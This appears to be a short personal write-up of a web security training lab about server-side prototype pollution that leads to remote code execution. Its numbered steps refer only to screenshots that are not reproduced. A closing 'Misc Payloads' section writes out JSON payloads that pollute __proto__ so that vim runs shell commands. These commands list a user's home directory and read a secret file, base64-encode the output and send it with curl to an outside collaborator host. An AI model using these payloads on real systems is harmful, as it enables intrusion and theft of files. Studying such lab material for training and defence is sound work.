
1. Send the following request to become admin;

![](Pasted_image_20231210203256.png)


2. Execute the following payload, at the same request to trigger the RCE

![](Pasted_image_20231210203430.png)

2. Go to ` Completed Maintenance Jobs` at the admin painel;

![](Pasted_image_20231210204519.png)

3. Execute the same request but now with the following payload;

![](Pasted_image_20231210204422.png)


![](Pasted_image_20231210204655.png)

4. Get the secret from carlos;

![](Pasted_image_20231210204738.png)
![](Pasted_image_20231210204845.png)
![](Pasted_image_20231210204829.png)

![](Pasted_image_20231210204838.png)


### Misc Payloads 


```json
"__proto__": { "shell":"vim", "input":":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n" }

```

```json
"input":":! ls /home/carlos | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"

```

```json
"input":":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"

```